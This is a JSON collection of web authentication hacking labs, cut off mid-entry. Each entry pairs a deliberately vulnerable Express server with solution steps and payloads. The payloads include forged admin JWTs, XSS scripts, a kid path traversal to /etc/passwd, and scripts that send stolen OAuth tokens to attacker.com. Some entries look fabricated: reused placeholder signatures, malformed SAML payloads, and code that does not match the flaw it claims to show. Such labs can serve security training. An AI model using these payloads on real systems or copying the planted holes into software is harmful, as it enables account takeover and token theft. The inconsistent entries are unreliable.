[
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
      "Decode the token using jwt.io to analyze its structure",
      "Modify the alg header to 'none' and change the role claim to 'admin'",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Submit the modified token in the Authorization header to access the admin panel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  }\n  res.status(403).send('Access denied');\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    ]
  },
  {
    "Lab scenario": "GraphQL query batching authentication bypass",
    "Lab Description": "The lab's GraphQL endpoint is vulnerable to query batching attacks that can bypass rate limiting on authentication attempts. The application processes batched queries sequentially without proper session checks. To solve: craft a batch query that simultaneously tests multiple credentials while appearing as a single request.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to capture a normal GraphQL login request",
      "Modify the request to include multiple login mutations in a single batch",
      "Structure the batch to test common credentials permutations",
      "Include a valid credential at the end to avoid triggering account lockouts",
      "Analyze responses to identify successful authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    login(username: String!, password: String!): AuthPayload\n  }\n  type AuthPayload {\n    token: String\n  }\n`;\nconst resolvers = {\n  Mutation: {\n    login: (_, { username, password }) => {\n      if (username === 'admin' && password === 's3cr3tP@ss') {\n        return { token: 'valid-token' };\n      }\n      return { token: null };\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "[{\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"password1\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"123456\\\") { token } }\"}, {\"query\":\"mutation { login(username: \\\"admin\\\", password: \\\"s3cr3tP@ss\\\") { token } }\"}]",
      "[{\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"password\"}}}, {\"query\":\"mutation($input: LoginInput!) { login(input: $input) { token } }\", \"variables\": {\"input\": {\"username\": \"admin\", \"password\": \"admin123\"}}}]"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through insecure redirect_uri",
    "Lab Description": "The lab's OAuth implementation fails to properly validate redirect_uri parameters, allowing token leakage. The application generates OAuth tokens before validating the redirect URI. To solve: intercept the OAuth flow and modify the redirect_uri to point to your attacker server to capture the authorization code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth login and intercept the authorization request with Burp Suite",
      "Modify the redirect_uri parameter to your controlled domain",
      "Allow the request to complete and observe the authorization code at your server",
      "Exchange the stolen code for an access token at the OAuth token endpoint",
      "Use the token to authenticate as the victim user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst clients = {\n  'labClient': {\n    secret: 'clientSecret123',\n    allowedRedirects: ['https://lab-domain.com/callback']\n  }\n};\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  const code = 'generated-auth-code-123';\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id] && clients[client_id].secret === client_secret) {\n    res.json({ access_token: 'valid-access-token', token_type: 'Bearer' });\n  } else {\n    res.status(401).json({ error: 'invalid_client' });\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://oauth-lab.com/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=https://attacker.com/callback",
      "https://oauth-lab.com/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://localhost:9999"
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in JWT token endpoint",
    "Lab Description": "The lab's JWT generation endpoint is vulnerable to XSS injection in custom claims, allowing session fixation attacks. The application fails to sanitize user-controlled input when generating tokens. To solve: craft a malicious JWT that executes XSS when decoded by the admin panel, then fixate this token as the admin's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the JWT generation request using Burp Suite and identify custom claim parameters",
      "Inject XSS payload into a custom claim (e.g., 'user_metadata') using Postman",
      "Encode the malicious JWT and use it to authenticate as a low-privilege user",
      "Report the token to the admin interface (simulated by clicking 'Report Abuse')",
      "Wait for admin to decode the token, executing the XSS and setting your token as their session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\napp.post('/generate-token', (req, res) => {\n  const { username, user_metadata } = req.body;\n  const token = jwt.sign({\n    username: username,\n    metadata: user_metadata,\n    role: 'user'\n  }, 'weaksecret', { algorithm: 'HS256' });\n  res.json({ token });\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.verify(token, 'weaksecret');\n  if (decoded.role === 'admin') {\n    res.send(`Welcome admin! Metadata: ${decoded.metadata}`);\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "{\"username\":\"attacker\",\"user_metadata\":\"<script>document.cookie='token='+localStorage.getItem('malicious_token')</script>\"}",
      "{\"username\":\"victim\",\"user_metadata\":\"javascript:eval(atob('ZG9jdW1lbnQuY29va2llPSd0b2tlbj0nK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdtYWxpY2lvdXNfdG9rZW4nKQ=='))\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through misconfigured CORS in REST API",
    "Lab Description": "The lab's OAuth implementation has overly permissive CORS headers, allowing token leakage to arbitrary domains. The application returns Access-Control-Allow-Credentials: true with wildcard origins. To solve: craft a malicious web page that steals OAuth tokens through credentialed CORS requests.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to analyze CORS headers during OAuth flow",
      "Create an HTML page with JavaScript to make credentialed XMLHttpRequest to the OAuth endpoint",
      "Host the page on an attacker-controlled domain",
      "Trick an authenticated user into visiting the malicious page",
      "Capture the leaked token from the server logs"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cors = require('cors');\nconst app = express();\napp.use(cors({\n  origin: '*',\n  credentials: true\n}));\nconst tokens = {};\napp.get('/oauth/token', (req, res) => {\n  const token = 'sample-oauth-token-' + Math.random().toString(36).substr(2);\n  tokens[token] = { user: 'admin', expires: Date.now() + 3600000 };\n  res.json({ access_token: token, token_type: 'Bearer' });\n});\napp.get('/profile', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  if (tokens[token]) {\n    res.json({ username: tokens[token].user });\n  } else {\n    res.status(401).send('Invalid token');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://vulnerable-oauth.com/profile', true); xhr.withCredentials = true; xhr.onreadystatechange = function() { if(xhr.readyState === 4) { fetch('https://attacker.com/steal?token='+xhr.responseText); } }; xhr.send();</script>",
      "<iframe src=\"javascript:xmlhttp=new XMLHttpRequest();xmlhttp.open('GET','https://vulnerable-oauth.com/oauth/token',true);xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href='https://attacker.com/leak?'+btoa(xmlhttp.responseText)}};xmlhttp.send();\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT key confusion attack through exposed JWKS endpoint",
    "Lab Description": "The lab's authentication system exposes a JWKS endpoint with leaked RSA private key parameters while accepting HS256-signed tokens. The application fails to validate the signing algorithm properly. To solve: convert the public key to HMAC secret, then craft an admin token signed with the converted key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover the JWKS endpoint through directory brute-forcing with OWASP ZAP",
      "Download the public key and convert it to PEM format using OpenSSL",
      "Use the PEM file as an HMAC secret to sign a modified JWT with algorithm HS256",
      "Replace the RS256-signed token with your HS256-signed version in Burp Repeater",
      "Verify admin access through the /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\nconst client = jwksClient({\n  jwksUri: 'http://localhost:3000/.well-known/jwks.json'\n});\napp.get('/.well-known/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      n: 'vGO...3Zw',\n      kid: '2023-01'\n    }]\n  });\n});\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  jwt.verify(token, (header, callback) => {\n    client.getSigningKey(header.kid, (err, key) => {\n      if (header.alg === 'HS256') {\n        return callback(null, key.rsaPublicKey);\n      }\n      callback(err, key.getPublicKey());\n    });\n  }, { algorithms: ['RS256', 'HS256'] }, (err, decoded) => {\n    if (err) return res.status(401).send('Invalid token');\n    res.json(decoded);\n  });\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjIwMjMtMDEifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjIwMjMtMDEifQ.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaXNzIjoiaHR0cHM6Ly92dWxuZXJhYmxlLWF1dGguY29tIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The lab's JWT validation microservice is vulnerable to key path traversal through the kid header. The application uses user-controlled kid values to load verification keys without proper sanitization. To solve: craft a JWT that forces the server to use a predictable public key file for verification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and analyze the kid header",
      "Modify the kid header to traverse directories (../../../../etc/passwd)",
      "Identify predictable key locations (../../keys/public.pem)",
      "Sign a new token with the predictable public key using HS256 algorithm",
      "Submit the token to bypass authentication and access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\napp.get('/verify', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  const keyPath = `/keys/${decoded.header.kid}`;\n  try {\n    const key = fs.readFileSync(keyPath);\n    jwt.verify(token, key, {algorithms: ['RS256', 'HS256']});\n    res.json({access: 'granted'});\n  } catch (e) {\n    res.status(403).json({error: 'Invalid token'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uL2tleXMvcHVibGljLnBlbSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.4j5D6vLJQV8JQ3X7yZ8w0nTmZnQJwW5cF7V9z2X1x4Y"
    ]
  },
  {
    "Lab scenario": "OAuth state parameter CSRF with open redirect",
    "Lab Description": "The lab's OAuth implementation fails to validate state parameters properly while having an open redirect vulnerability. The application accepts arbitrary redirect_uri values and doesn't store state parameters server-side. To solve: craft a malicious link that captures victim tokens through CSRF and open redirect chaining.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to identify the open redirect in the OAuth flow",
      "Create a CSRF payload that triggers OAuth authorization",
      "Chain the open redirect to point to an attacker-controlled server",
      "Embed the payload in a phishing page and lure the victim",
      "Capture the authorization code from server logs and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/authorize', (req, res) => {\n  const {client_id, redirect_uri, state} = req.query;\n  if (client_id === 'vulnerable-client') {\n    const code = 'random-auth-code';\n    res.redirect(`${redirect_uri}?code=${code}&state=${state||''}`);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\napp.get('/redirect', (req, res) => {\n  res.redirect(req.query.url);\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/oauth/authorize?client_id=vulnerable-client&redirect_uri=https://attacker.com&state=csrf-token",
      "https://vulnerable-oauth.com/redirect?url=https://attacker.com/steal?token=[OAuth-code]"
    ]
  },
  {
    "Lab scenario": "Session swapping via concurrent login race condition",
    "Lab Description": "The lab's session management system is vulnerable to race conditions during concurrent login attempts. The application generates session tokens before validating credentials, allowing session swapping between users. To solve: perform concurrent login attempts to swap a low-privilege session with an admin session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite Turbo Intruder to send rapid concurrent login requests",
      "Interleave admin credential attempts with valid low-privilege logins",
      "Capture successful responses and analyze session tokens",
      "Identify token collisions where admin privileges are granted",
      "Use the swapped session token to access restricted endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  const token = Math.random().toString(36).substr(2);\n  sessions[token] = {user: username, authenticated: false};\n  if (username === 'admin' && password === 's3cr3tP@ss') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'admin';\n  } else if (username === 'user' && password === 'password123') {\n    sessions[token].authenticated = true;\n    sessions[token].role = 'user';\n  }\n  res.cookie('session', token);\n  res.json({status: 'success'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.authenticated && session.role === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 38\n\nusername=admin&password=s3cr3tP@ss",
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 32\n\nusername=user&password=password123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via pre-authentication session fixation",
    "Lab Description": "The lab's multi-factor authentication creates authenticated sessions before MFA completion. The application assigns session cookies during username/password validation but doesn't invalidate them if MFA fails. To solve: fixate a pre-MFA session and brute-force the verification code while maintaining the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the initial login request with Burp Suite",
      "Extract the session cookie set after username/password validation",
      "Fixate this cookie in a new browser session",
      "Use Burp Intruder to brute-force MFA codes while maintaining the session",
      "Access protected resources when any MFA code is accepted"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const {username, password} = req.body;\n  if (username === 'admin' && password === 's3cr3t') {\n    const sessionId = Math.random().toString(36).substr(2);\n    sessions[sessionId] = {user: username, mfaVerified: false};\n    res.cookie('session', sessionId);\n    return res.json({mfaRequired: true});\n  }\n  res.status(401).json({error: 'Invalid credentials'});\n});\napp.post('/verify-mfa', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session && req.body.code === '123456') {\n    session.mfaVerified = true;\n    return res.json({status: 'verified'});\n  }\n  res.status(403).json({error: 'Invalid code'});\n});\napp.get('/admin', (req, res) => {\n  const session = sessions[req.cookies.session];\n  if (session?.mfaVerified) {\n    res.send('Admin panel accessed');\n  } else {\n    res.status(403).send('MFA required');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /verify-mfa HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id\nContent-Type: application/json\nContent-Length: 15\n\n{\"code\":\"§123456§\"}",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=stolen-session-id"
    ]
  },
  {
    "Lab scenario": "JWT claim injection via GraphQL introspection",
    "Lab Description": "The lab's GraphQL endpoint exposes JWT generation through introspection while failing to validate nested claims. The application processes arbitrary claim injection through nested query parameters. To solve: craft a GraphQL query that injects admin privileges into a self-generated JWT.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use GraphiQL to discover the JWT generation mutation through introspection",
      "Analyze the token generation schema with OWASP ZAP",
      "Construct a nested query injecting admin:true into the claims object",
      "Execute the mutation to generate a valid admin token",
      "Use the token to access restricted admin mutations"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\nconst typeDefs = gql`\n  type Mutation {\n    generateToken(claims: JSON!): String\n  }\n  scalar JSON\n`;\nconst resolvers = {\n  Mutation: {\n    generateToken: (_, { claims }) => {\n      return jwt.sign(claims, 'weaksecret', { algorithm: 'HS256' });\n    }\n  }\n};\nconst server = new ApolloServer({ typeDefs, resolvers });\nserver.applyMiddleware({ app });\napp.listen(4000);",
    "payloads": [
      "mutation { generateToken(claims: { sub:\"user\", admin:true }) }",
      "query Introspection { __schema { mutationType { fields { name args { name } } } } }"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through WebSocket handshake",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket upgrades by including them in clear text. The application fails to strip authentication headers during protocol switching. To solve: intercept the WebSocket handshake to harvest active OAuth tokens from other users.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections with Burp Suite",
      "Identify Authorization headers in upgrade requests",
      "Modify upgrade requests to target different user sessions",
      "Capture valid tokens from successful handshakes",
      "Reuse stolen tokens in REST API requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nwss.on('connection', (ws, req) => {\n  const token = req.headers.authorization.split(' ')[1];\n  ws.send(`Connected with token: ${token}`);\n});\napp.get('/oauth/token', (req, res) => {\n  res.json({ access_token: 'sample-token-' + Math.random().toString(36).substr(2) });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nAuthorization: Bearer [stolen-token]\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
      "wss://vulnerable-app.com/chat?token=[stolen-token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via malformed SAML assertion",
    "Lab Description": "The lab's SAML implementation accepts unsigned assertions in certain conditions. The application fails to properly validate XML signatures when receiving malformed NameID elements. To solve: craft a SAML response with a malformed NameID to fixate a session for any user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture valid SAML flow using Burp Suite SAML Raider",
      "Modify the NameID element to break XML signature validation",
      "Inject a target username in the malformed assertion",
      "Bypass signature verification by exploiting the parsing error",
      "Authenticate as the target user with the fixated session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst saml = require('saml20');\nconst app = express();\napp.post('/saml/acs', (req, res) => {\n  saml.validate(req.body.SAMLResponse, { audience: 'vulnerable-sp' }, (err, profile) => {\n    if (err && err.message.includes('NameID')) {\n      const raw = atob(req.body.SAMLResponse);\n      const user = raw.match(/NameID.*?>(.*?)</)[1];\n      res.cookie('session', user);\n      return res.redirect('/');\n    }\n    res.status(403).send('Invalid SAML response');\n  });\n});\napp.listen(3000);",
    "payloads": [
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0iZGVsIi8+PHg6YXR0ciBuYW1lPSJ1c2VyIj5hZG1pbjwvOjwvTmFtZUlEPjwvc2FtbHA6UmVzcG9uc2U+",
      "PHNhbWxwOlJlc3BvbnNlPjxOYW1lSUQ+PC9OYW1lSUQ+PHNhbWw6QXNzZXJ0aW9uPjxOYW1lSUQ+PHhzaTp0eXBlIHg6dHlwZT0ic3RyaW5nIj5hZG1pbjwveHNpOnR5cGU+PC9OYW1lSUQ+"
    ]
  },
  {
    "Lab scenario": "MFA bypass via state parameter injection",
    "Lab Description": "The lab's MFA verification accepts state parameters that modify the target account. The application fails to validate state consistency between initiation and completion. To solve: inject a target username in the state parameter during MFA initiation to bypass verification for that account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA initiation request with Burp Suite",
      "Modify the state parameter to include target username",
      "Complete MFA with valid code for your account",
      "Observe session granted for the target account",
      "Access restricted resources as the target user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst sessions = {};\napp.get('/mfa/init', (req, res) => {\n  const state = JSON.parse(Buffer.from(req.query.state, 'base64').toString());\n  sessions[req.cookies.session] = { verifying: state.user || req.user };\n  res.json({ code: '123456' });\n});\napp.post('/mfa/verify', (req, res) => {\n  if (req.body.code === '123456') {\n    const session = sessions[req.cookies.session];\n    session.user = session.verifying;\n    return res.redirect('/account');\n  }\n  res.status(403).send('Invalid code');\n});\napp.listen(3000);",
    "payloads": [
      "GET /mfa/init?state=eyJ1c2VyIjoiYWRtaW4ifQ== HTTP/1.1",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ncode=123456"
    ]
  },
  {
    "Lab scenario": "JWT algorithm downgrade via HTTP/2 request smuggling",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm downgrade attacks when processing HTTP/2 requests. The application fails to properly validate the alg header when requests are smuggled through HTTP/2 connection coalescing. To solve: craft an HTTP/2 request that smuggles a JWT with none algorithm while appearing as a valid RS256 token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept HTTP/2 traffic and enable HTTP/2 request smuggling",
      "Modify the Content-Length and Transfer-Encoding headers to create a smuggled request",
      "Craft a JWT with alg:none in the smuggled portion of the request",
      "Maintain a valid RS256 header in the outer request to bypass initial checks",
      "Verify admin access through the smuggled none-algorithm token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst http2 = require('http2');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  try {\n    jwt.verify(token, 'publicKey.pem', {algorithms: ['RS256']});\n    res.send('Admin access granted');\n  } catch (e) {\n    try {\n      jwt.decode(token, {complete: true});\n      res.send('Admin access granted');\n    } catch {\n      res.status(403).send('Access denied');\n    }\n  }\n});\nconst server = http2.createServer();\nserver.on('stream', (stream, headers) => {\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(3000);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nContent-Length: 0\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through DNS rebinding",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS rebinding attacks during token redemption. The application fails to validate the Host header against the redirect_uri domain during token exchange. To solve: create a malicious site that performs DNS rebinding to capture OAuth tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Register a domain pointing to a DNS service with short TTL",
      "Configure the domain to alternate between attacker IP and vulnerable OAuth service IP",
      "Initiate OAuth flow with redirect_uri pointing to malicious domain",
      "When victim visits, perform DNS rebinding to make browser think it's talking to OAuth service",
      "Capture the authorization code and exchange for token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/oauth/token', (req, res) => {\n  if (req.query.code && req.query.redirect_uri) {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    res.json({access_token: token});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/authorize?response_type=code&client_id=client&redirect_uri=http://malicious.site/callback",
      "fetch('http://malicious.site/token?code=stolen-code')"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebRTC ICE candidate leakage",
    "Lab Description": "The lab's WebRTC implementation leaks session tokens through ICE candidate messages. The application includes session cookies in STUN/TURN authentication and fails to filter them from ICE candidate responses. To solve: intercept WebRTC negotiation to harvest session tokens from ICE candidates.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebRTC peer connection requests using Burp Suite",
      "Analyze ICE candidate messages for leaked session tokens",
      "Modify SDP offers to force more candidate generation",
      "Capture valid session tokens from STUN authentication fields",
      "Use stolen tokens to hijack user sessions"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\nconst { RTCPeerConnection } = require('wrtc');\napp.post('/webrtc/connect', (req, res) => {\n  const pc = new RTCPeerConnection({\n    iceServers: [{urls: 'stun:stun.l.google.com:19302'}],\n    iceCandidatePoolSize: 5\n  });\n  pc.onicecandidate = (e) => {\n    if (e.candidate) {\n      res.write(`a=${e.candidate.candidate} ${req.cookies.session}\\r\\n`);\n    } else {\n      res.end();\n    }\n  };\n  pc.createDataChannel('');\n  pc.createOffer().then(offer => pc.setLocalDescription(offer));\n});\napp.listen(3000);",
    "payloads": [
      "a=candidate:1 1 UDP 2122252543 192.168.1.1 12345 typ host session=abcd1234",
      "o=- 0 0 IN IP4 127.0.0.1\ns=-\nc=IN IP4 127.0.0.1\nt=0 0\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\n"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebSocket session inheritance",
    "Lab Description": "The lab's MFA verification inherits WebSocket sessions from pre-authentication connections. The application associates MFA state with WebSocket connections rather than HTTP sessions. To solve: establish a WebSocket connection before authentication, complete MFA on a different channel, then reuse the WebSocket connection.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish a WebSocket connection to the application before authentication",
      "Initiate MFA verification through normal HTTP login flow",
      "Complete MFA verification in a separate browser tab",
      "Reuse the original WebSocket connection which inherits the authenticated state",
      "Send privileged commands through the WebSocket connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const sessionId = req.url.split('session=')[1];\n  sessions[ws] = sessionId || 'pre-auth';\n  ws.on('message', (msg) => {\n    if (sessions[ws] !== 'pre-auth') {\n      ws.send(`Executing as ${sessions[ws]}`);\n    }\n  });\n});\napp.post('/mfa/verify', (req, res) => {\n  for (let [ws, session] of Object.entries(sessions)) {\n    if (session === 'pre-auth') {\n      sessions[ws] = req.body.user;\n    }\n  }\n  res.json({status: 'verified'});\n});",
    "payloads": [
      "wss://vulnerable-app.com/chat?session=pre-auth",
      "POST /mfa/verify HTTP/1.1\nContent-Type: application/json\n\n{\"user\":\"admin\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 pseudo-headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 pseudo-header manipulation. The application fails to properly validate the :path pseudo-header when extracting claims, allowing duplicate claims in different header contexts. To solve: craft an HTTP/2 request that smuggles conflicting claims through pseudo-header manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify the :path pseudo-header to include additional JWT claims",
      "Maintain valid JWT structure in the Authorization header",
      "Exploit parser differential between frontend and backend servers",
      "Verify admin access through the smuggled claims"
    ],
    "Vulnerability name": "Authentication",
